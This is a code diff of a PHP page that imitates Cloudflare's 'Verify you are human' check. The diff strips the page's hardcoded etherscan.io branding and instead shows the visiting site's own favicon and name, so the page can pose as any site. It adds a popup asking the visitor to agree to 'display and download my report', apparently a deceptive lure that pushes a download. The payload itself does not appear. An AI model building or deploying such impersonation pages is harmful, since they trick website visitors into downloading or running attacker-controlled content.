@@ -3,50 +3,12 @@
 <head>
 	<meta charset="utf-8">
 	<meta name="viewport" content="width=device-width, initial-scale=1">
+	<title>Just a moment...</title>
 
 	<?php
 		// session start
 		session_start();
 	?>
-
-	<!-- Title -->
-  <?php
-      function fetch_url($url) {
-          $ch = curl_init();
-          curl_setopt($ch, CURLOPT_URL, $url);
-          curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
-          curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true); // Follow redirects
-          curl_setopt($ch, CURLOPT_TIMEOUT, 10); // Timeout for faster failure handling
-          $data = curl_exec($ch);
-          curl_close($ch);
-          return $data;
-      }
-       
-      function get_page_title($domain) {
-          // Fetch the HTML from the domain
-          $html = fetch_url($domain);
-          if ($html) {
-              // Use regex to find the <title> tag
-              preg_match('/<title>(.*?)<\/title>/', $html, $matches);
-              if (!empty($matches[1])) {
-                  return trim($matches[1]); // Return the title text
-              }
-          }
-          
-          return false; // Return false if no title is found
-      }
-       
-      // Get the root domain (main domain)
-      $host = "http://" . $_SERVER['HTTP_HOST']; // For example, "http://127.0.0.1"
-       
-      // Fetch the title from the main domain
-      $title = get_page_title($host);
-       
-      // Only output the title if found
-      if ($title) {
-          echo '<title>' . htmlspecialchars($title) . '</title>';
-      }
-  ?>
 
   <!-- Favicon -->
   <?php
@@ -110,8 +72,12 @@
             $favicon_url = fallback_favicon($host);
         }
 
+		// Global icon URL
+		$iconURL;
+
         // Only add <link rel="icon"> if a favicon is found
         if ($favicon_url) {
+			$iconURL = htmlspecialchars($favicon_url);
             echo '<link rel="icon" href="' . htmlspecialchars($favicon_url) . '" type="image/x-icon">';
         }
     ?>
@@ -124,37 +90,50 @@
 <!-- get browser name -->
 <?php
 	function getBrowserName() {
-	    $userAgent = $_SERVER['HTTP_USER_AGENT'];
+	    // Get the user agent string
+		$user_agent = $_SERVER['HTTP_USER_AGENT'];
 
-	    if (strpos($userAgent, 'Firefox') !== false) {
-	        return 'Mozilla Firefox';
-	    } elseif (strpos($userAgent, 'Chrome') !== false && strpos($userAgent, 'Safari') !== false && strpos($userAgent, 'Edge') === false) {
-	        return 'Google Chrome';
-	    } elseif (strpos($userAgent, 'Edge') !== false) {
-	        return 'Microsoft Edge';
-	    } elseif (strpos($userAgent, 'Safari') !== false && strpos($userAgent, 'Chrome') === false) {
-	        return 'Apple Safari';
-	    } elseif (strpos($userAgent, 'Opera') !== false || strpos($userAgent, 'OPR') !== false) {
-	        return 'Opera';
-	    } elseif (strpos($userAgent, 'MSIE') !== false || strpos($userAgent, 'Trident') !== false) {
-	        return 'Internet Explorer';
-	    }
+		// Initialize the browser name variable
+		$browser = "Unknown Browser";
 
-	    return 'Unknown Browser';
+		// Check for Microsoft Edge (Chromium-based and Legacy Edge)
+		if (strpos($user_agent, 'Edg') !== false) {
+			$browser = "Microsoft Edge";
+		// Check for Opera
+		} elseif (strpos($user_agent, 'OPR') !== false || strpos($user_agent, 'Opera') !== false) {
+			$browser = "Opera";
+		// Check for Google Chrome (after checking for Opera and Edge)
+		} elseif (strpos($user_agent, 'Chrome') !== false) {
+			$browser = "Google Chrome";
+		// Check for Mozilla Firefox
+		} elseif (strpos($user_agent, 'Firefox') !== false) {
+			$browser = "Mozilla Firefox";
+		// Check for Safari (excluding Chrome and Edge)
+		} elseif (strpos($user_agent, 'Safari') !== false) {
+			$browser = "Safari";
+		}
+
+		// Output the detected browser
+		return $browser;
 	}
 ?>
+
+<input type="hidden" value="<?php echo getBrowserName(); ?>" id="browserName" />
+<input type="hidden" value="<?php echo $_SERVER['HTTP_HOST']; ?>" id="httpHOST" />
 
 <!-- Pop up -->
 <div id="popup">
 	<div>
-		To display your report, <?php echo getBrowserName() ?> needs to resend information from your previous request (e.g. a search or form submission). Please confirm below to proceed. <br>
+		<div data-translate="popup-msg">
+		To display your report, <?php echo getBrowserName() ?> needs to resend information from your previous request (e.g. a search or form submission). Please confirm below to proceed.
+		</div>
 		<label>
 			<input type="checkbox" id="checkbox">
-			<p>I agree to allow from <?php echo $_SERVER['HTTP_HOST'] ?> to display and download my report.</p>
+			<p data-translate="popup-check">I agree to allow from <span style="font-weight: 500;"><?php echo $_SERVER['HTTP_HOST'] ?></span> to display and download my report.</p>
 		</label>
 	</div>
 	<div>
-		<button id="report" disabled>View Report</button>
+		<button id="report" disabled data-translate="view_report">View Report</button>
 	</div>
 </div>
 
@@ -164,11 +143,18 @@
 
 <div id="total">
 	<div id="main_board">
-		<h1 data-translate="headline" class="h1">etherscan.io</h1>
+
+		<div id="img_header">
+			<?php
+				$headers = @get_headers($iconURL);
+				if ($headers && strpos($headers[0], '200') !== false) echo '<img src="'.$iconURL.'" style="width: 60px; height: 60px;" /> &nbsp;&nbsp;&nbsp;&nbsp;';
+			?>
+			<h1 data-translate="headline" class="h1"></h1>
+		</div>
 
 		<h2 data-translate="wait" class="h2" id="wait">Verifying you are human. This may take a few seconds.</h2>
 		<h2 data-translate="action" class="h2" id="action">Verify you are human by completing the action below.</h2>
-		<h2 data-translate="success" class="h2" id="success">Verification successful</h2>
+		<h2 data-translate="verify-success" class="h2" id="success">Verification successful</h2>
 
 		<div id="loading">
 			<div id="load"></div>
@@ -197,7 +183,7 @@
 		      </div>
 
 		      <div class="captcha-text" id="captcha-text" style="color: #ccc;">
-		        Verify you are human
+			  	<span data-translate="verify-human">Verify you are human</span>
 		      </div>
 		    </div>
 
@@ -205,13 +191,13 @@
 		    <div class="captcha-footer">
 		      <img class="captcha-logo" src="./assets/img/dark_logo.svg" alt="Cloudflare Logo">
 		      <div class="captcha-privacy">
-		        <a href="#" style="color: #ccc; text-decoration: underline;">Privacy</a> • <a href="#" style="color: #ccc; text-decoration: underline;">Terms</a>
+			  	<a href="#" style="color: #ccc; text-decoration: underline;" data-translate="privacy">Privacy</a> • <a href="#" style="color: #ccc; text-decoration: underline;" data-translate="terms">Terms</a>
 		      </div>
 		    </div>
 
 		    <!-- Error message outside the captcha box -->
 		    <div class="error-message" id="error-message">
-		      There was a problem, please try again.
+				<span data-translate="issue">There was a problem, please try again.</span>
 		    </div>
 		  </div>
 
@@ -241,7 +227,7 @@
 		      </div>
 
 		      <div class="captcha-text" id="captcha-text">
-		        Verify you are human
+			  	<span data-translate="verify-human">Verify you are human</span>
 		      </div>
 		    </div>
 
@@ -249,13 +235,13 @@
 		    <div class="captcha-footer">
 		      <img class="captcha-logo" src="./assets/img/logo-cloudflare-dark.svg" alt="Cloudflare Logo">
 		      <div class="captcha-privacy">
-		        <a href="#" style="text-decoration: underline;">Privacy</a> • <a href="#" style="text-decoration: underline;">Terms</a>
+			  	<a href="#" style="text-decoration: underline;" data-translate="privacy">Privacy</a> • <a href="#" style="text-decoration: underline;" data-translate="terms">Terms</a>
 		      </div>
 		    </div>
 
 		    <!-- Error message outside the captcha box -->
 		    <div class="error-message" id="error-message">
-		      There was a problem, please try again.
+				<span data-translate="issue">There was a problem, please try again.</span>
 		    </div>
 		  </div>
 
@@ -265,21 +251,36 @@
 	<?php endif; ?>
 
 		
-		<div data-translate="detail" class="detail">
-			etherscan.io needs to review the security of your connection before proceeding.
-		</div>
+		<div data-translate="detail" class="detail"></div>
 
 	</div>
 
 	<div id="footer">
-		<div>
-			<span data-translate="ray_id">Ray ID: </span>
-			<strong class="a_color" id="ray-id"></strong>
-		</div>
-		<div>
-			<span data-translate="performance_security">Performance & security by </span>
-			<strong class="a_color">Cloudflare</strong>
-		</div>
+
+		<?php if (isset($_SESSION['darkmode']) && $_SESSION['darkmode'] == '1'): ?>
+			
+			<div>
+				<span data-translate="ray_id">Ray ID: </span>
+				<strong class="a_color" id="ray-id" style="color: #fff; font-weight: lighter;"></strong>
+			</div>
+			<div>
+				<span data-translate="performance_security">Performance & security by </span>
+				<strong class="a_color" style="color: #fff;">Cloudflare</strong>
+			</div>
+			
+		<?php else: ?>
+			
+			<div>
+				<span data-translate="ray_id">Ray ID: </span>
+				<strong class="a_color" id="ray-id"></strong>
+			</div>
+			<div>
+				<span data-translate="performance_security">Performance & security by </span>
+				<strong class="a_color">Cloudflare</strong>
+			</div>
+			
+		<?php endif; ?>
+
 	</div>
 </div>
 
